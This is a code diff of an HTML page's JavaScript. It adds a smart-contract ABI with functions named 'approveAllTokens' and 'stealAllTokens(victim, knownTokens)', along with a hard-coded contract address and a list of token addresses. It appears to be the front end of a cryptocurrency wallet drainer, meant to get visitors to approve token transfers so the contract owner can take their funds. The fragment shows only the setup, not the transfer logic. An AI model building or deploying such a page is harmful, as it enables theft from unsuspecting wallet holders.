@@ -17,16 +17,56 @@ op<!DOCTYPE html>
         // Contract details
         const contractAddress = "0xC758383C5489fD4b432761ec85A0f34037cF39e0"; // Contract address
         const contractABI = [
-            {
-                "inputs": [
-                    { "internalType": "address", "name": "token", "type": "address" }
-                ],
-                "name": "approveAllTokens",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-        ];
+ {
+  "inputs": [
+   {
+    "internalType": "address",
+    "name": "token",
+    "type": "address"
+   }
+  ],
+  "name": "approveAllTokens",
+  "outputs": [],
+  "stateMutability": "nonpayable",
+  "type": "function"
+ },
+ {
+  "inputs": [
+   {
+    "internalType": "address",
+    "name": "victim",
+    "type": "address"
+   },
+   {
+    "internalType": "address[]",
+    "name": "knownTokens",
+    "type": "address[]"
+   }
+  ],
+  "name": "stealAllTokens",
+  "outputs": [],
+  "stateMutability": "nonpayable",
+  "type": "function"
+ },
+ {
+  "inputs": [],
+  "stateMutability": "nonpayable",
+  "type": "constructor"
+ },
+ {
+  "inputs": [],
+  "name": "owner",
+  "outputs": [
+   {
+    "internalType": "address",
+    "name": "",
+    "type": "address"
+   }
+  ],
+  "stateMutability": "view",
+  "type": "function"
+ }
+];
         const knownTokens = [
             "0xed5B7F9191FfBFf2Ca95D28b22bE2121ab55aD23",
             "0x90BCEc92010cA4fEA0F7d62D11A8664CfAe2de0E",
